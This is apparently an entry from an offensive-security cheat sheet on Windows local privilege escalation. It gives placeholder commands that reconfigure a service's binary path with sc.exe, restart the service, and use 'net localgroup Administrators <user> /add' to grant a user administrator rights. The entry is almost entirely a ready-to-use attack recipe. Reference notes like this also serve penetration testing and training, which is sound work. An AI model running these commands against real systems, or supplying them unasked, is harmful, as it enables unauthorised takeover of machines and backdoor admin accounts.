# windows

#plateform/windows #target/local #cat/PRIVESC/TOKEN



## modify service bin path
"net localgroup Administrators <user> /add"
sc.exe start <service>
```cmd
sc.exe config <service> binpath= "<program>"
```